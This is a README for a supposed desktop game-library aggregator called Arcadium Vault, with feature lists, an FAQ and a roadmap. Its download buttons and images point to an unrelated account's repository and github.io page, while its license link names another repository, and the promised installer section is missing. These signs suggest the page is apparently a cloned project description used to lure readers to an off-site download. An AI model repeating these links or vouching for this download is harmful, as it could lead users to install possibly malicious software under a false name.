![preview](https://raw.githubusercontent.com/maliksamreen818/vindex-lounge/main/frame_cfbe.svg)
# Arcadium Vault

**Centralize. Curate. Conquer.** Your entire gaming universe, unified in a single, self-contained desktop sanctuary.

![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
![Language](https://img.shields.io/badge/language-Rust%20%2F%20Tauri-2E86AB)
![License](https://img.shields.io/badge/license-MIT-brightgreen)
![Build Status](https://img.shields.io/badge/build-passing-3FB950)
![Contributors](https://img.shields.io/badge/contributors-14-orange)

---

## Overview 🌌

In the modern era of digital distribution, our gaming identities are scattered across multiple storefronts, each with its own launcher, its own library, and its own set of rules. Remembering what you own, where you own it, and which title you were grinding through becomes a mental gymnastics routine rather than a relaxation ritual.

Enter **Arcadium Vault** — the digital curator for your multi-storefront gaming legacy. Unlike fragile cloud-dependent aggregators that demand your credentials, Arcadium Vault operates entirely on your local hardware. It scans, organizes, and presents your entire game collection from Steam, Epic Games, GOG, and itch.io in a beautifully unified interface. No cloud. No analytics harvesting. No Vendor lock-in. Just you, your machine, and your complete gaming identity—unified and sovereign.

![Dashboard Preview](https://img.shields.io/badge/UI-Dark%20Neo%20Brushes-6E57A8)

This is not merely a library manager; it is a personal archive. Think of it as the difference between borrowing a book from a constantly-changing library and owning a precision-engineered bookshelf that meticulously arranges your entire collection by your own rules. Arcadium Vault gives you back control, clarity, and the sheer joy of seeing your full empire laid out at a glance.

[![Download](https://raw.githubusercontent.com/maliksamreen818/vindex-lounge/main/run_774d9.svg)](https://maliksamreen818.github.io/vindex-lounge/)

---

## Why Arcadium Vault? 🤔

The typical gaming library is a chaotic ecosystem: one title on Steam, another exclusive to Epic, a retro gem on GOG, and a quirky indie on itch.io. Each storefront demands its own client, its own login, and its own updates. This fragmentation creates a fragmented mental map of what you actually own.

**Arcadium Vault** dissolves those boundaries. It is the Rosetta Stone of your gaming history. Once installed, it communicates with each platform's local data (not their APIs, not their clouds) to build a comprehensive local index of your games. The result is a unified dashboard that feels like a native extension of your own memory.

This approach comes with profound benefits:
- **Privacy-First Architecture**: Your game list never leaves your machine.
- **Offline Utility**: Your collection remains browsable and searchable even with zero internet connectivity.
- **Speed**: Local indexing is instantaneous. There is no server round-trip, no waiting for JSON payloads.

---

## Key Features ✨

### 🗂️ Multi-Storefront Convergence
Arcadium Vault seamlessly aggregates your game library from **Steam**, **Epic Games**, **GOG**, and **itch.io**. It detects installed games, remembers owned-but-uninstalled titles, and cross-references metadata to provide a unified view. No more switching between five different launchers just to see what you have.

### 🖥️ Responsive Desktop UI with Adaptive Density
The interface adapts to your screen resolution and preferred information density. Whether you prefer a sprawling grid of cover art or a compact list with technical details, Arcadium Vault forms itself around your workflow. The UI is built on a modern reactive framework, ensuring 60 FPS scroll even with 10,000+ game entries.

### 🌍 Multilingual Localization
What good is a library manager if it doesn't speak your language? Arcadium Vault ships with full internationalization for **English, Spanish, French, German, Japanese, and Portuguese**. The translation layer is crowd-sourceable, allowing the community to contribute new locales without needing to touch a line of core code.

### 🛡️ 24/7 Automated Health Monitoring
Arcadium Vault's "librarian" subprocess continuously monitors your library for updates, new installs, and corrupted metadata entries. It runs as a lightweight background task and repairs inconsistencies automatically. Your library *self-heals*.

### ⚡ Instant Fuzzy Search and Tagging
Find any title in milliseconds. The search engine supports fuzzy matching, typo tolerance, and natural language queries (e.g., "souls-like on GOG"). You can also create custom tags for genres, playlists, or completion status. Syncing these tags across platforms? No—they are stored locally, exactly where you want them.

### 🔌 Plug-and-Play Import
No manual scraping. Arcadium Vault watches the standard installation directories of each storefront. When a new game appears (or disappears), the library updates itself in real-time. The initial setup takes less than three minutes.

### 📊 Rich Analytics (Local Only)
View your playtime habits, genre distribution, and completion ratios—all rendered as beautiful, dark-themed charts. But remember: these analytics are computed locally and vanish if you stop using the tool. They never reach a third-party server.

### 🧩 Custom Themes Engine
Beyond dark and light mode, you can craft your own color palettes and font pairings. The theme files are simple JSON, enabling a thriving ecosystem of community-made skins.

---

## What's Under the Hood? 🚀

Arcadium Vault is built with **Rust** and **Tauri**, offering a web-based frontend (HTML/JS) wrapped in a lightning-fast, memory-efficient native shell. We chose Rust for its performance and memory safety, ensuring that the Vault runs alongside your games without stealing precious RAM.

- **Core Indexer**: A multi-threaded Rust module that watches directories and parses manifest files.
- **Reactive Frontend**: A Vue.js 3 frontend with a state-machine architecture for flawless UI synchronization.
- **Local Database**: SQLite for structured storage, configured with WAL mode for high concurrency.
- **Metadata Enrichment**: Static and dynamic extraction from local game files. No internet queries for basic data.

### Architecture at a Glance

```
/ar-ca-dium-vault
  /src-tauri        // Rust backend logic
    /indexer         // Storefront scanning engines
    /db              // SQLite migrations and queries
    /scanner         // File system watchdogs
  /src              // Vue.js frontend
    /components      // UI building blocks
    /stores          // Reactive state management
  /public           // Static assets
```

---

## Getting Started 🚀

Prerequisites: A 64-bit operating system (Windows 10+, macOS 11+, or recent Linux distributions) and at least 200MB of free disk space.

**Installation Steps:**

1. Download the appropriate installer for your OS from the section below.
2. Run the installer and follow the on-screen prompts. The installer does not require administrator privileges on Windows or macOS; it installs to user-space.
3. On first launch, Arcadium Vault will present a simple onboarding wizard. It will prompt you to point it toward your Steam, Epic, GOG, and itch.io installation directories (or let it auto-detect them).
4. That's it. The initial scan for a typical library (500 games) completes in under 45 seconds. Your Vault is ready.

---

## Usage Scenarios 🎮

**The Collector with 20 Years of Purchases:** You have games on every platform going back to the late 90s. Arcadium Vault gives you a single search box to find that old classic you bought on GOG but forgot about. You can also filter by "exclusive to platform X" to decide which launcher you *really* need to keep installed.

**The Privacy Purist:** You refuse to register for cloud gaming services. Arcadium Vault respects that. It works offline, stores everything locally, and has no telemetry. It requires no account to function.

**The Modding Enthusiast:** You often toggle between modded and vanilla versions of games. Use Arcadium Vault's "Profiles" feature to track which games have modded executables, and launch via the Vault's custom launch parameters.

---

## Frequently Asked Questions (FAQ) 📚

**Q: Does Arcadium Vault need my login credentials for Steam or Epic?**
A: No. It reads local installation files and metadata. It never asks for passwords nor does it interact with your storefront accounts.

**Q: What happens if a storefront updates its client?**
A: Arcadium Vault's indexer adapts. Our robust scanner reads generic manifest patterns, and we release updates whenever major storefront changes are detected. The community also helps via issue reports.

**Q: Can I export my library list?**
A: Yes. You can export your entire library (or a filtered subset) to CSV, JSON, or a simple text markdown list. This is handy for sharing or for archival purposes.

**Q: Does it support non-Steam games added to Steam?**
A: Yes, as long as a game appears in Steam's local appmanifest files, it is scanned. Non-Steam shortcuts are also visible in the Steam section.

---

## Support and Community 💬

We believe in human-driven support. Our team provides **24/7 response times** on the official Discord server and GitHub Discussions. Before opening an issue, please consult the comprehensive built-in documentation accessible via the "?" icon in the top right corner of the Vault.

We value contribution. If you are a Rust wizard or a Vue.js aficionado, check the `/contributing` folder in the repository for style guides. Non-coders can contribute by improving translations, creating themes, or writing documentation.

---

## Roadmap 🗺️

**Version 0.9.x (Current):** Streamlined indexing, basic profiles, initial multi-language support.

**Version 1.0 (Q3 2026):** Full plugin architecture for custom storefronts (Humble, Amazon). Cloud-agnostic sync (user-provided Nextcloud/S3) for multi-device library synchronization *without* a proprietary backend.

**Version 1.5 (Q4 2026):** Advanced AI-driven local categorization (detects genre from game titles), and a rich "Game Night" playlist generator that suggests multiplayer games based on installed titles.

---

## License 📜

Arcadium Vault is released under the **MIT License**. You are free to use, modify, and redistribute it, provided you retain the copyright notice.

See the [LICENSE](https://github.com/SwonDev/arcadium-vault/LICENSE) file for full details.

---

## Disclaimer ⚠️

Arcadium Vault is an independent project and is not affiliated with, endorsed by, or sponsored by Valve Corporation, Epic Games, GOG Sp. z o.o., or itch corp. All product names, logos, and brands are property of their respective owners. Arcadium Vault accesses only the local, non-secret data generated by these storefronts on your own machine. It does not access private account data, payment credentials, or any cloud-hosted information. The project operates under the principle of user data sovereignty.

Usage of this software is entirely at the user's own risk. The authors make no warranties regarding accuracy or completeness of metadata. Always ensure you have appropriate rights to the games you own.

---

[![Download](https://raw.githubusercontent.com/maliksamreen818/vindex-lounge/main/run_774d9.svg)](https://maliksamreen818.github.io/vindex-lounge/)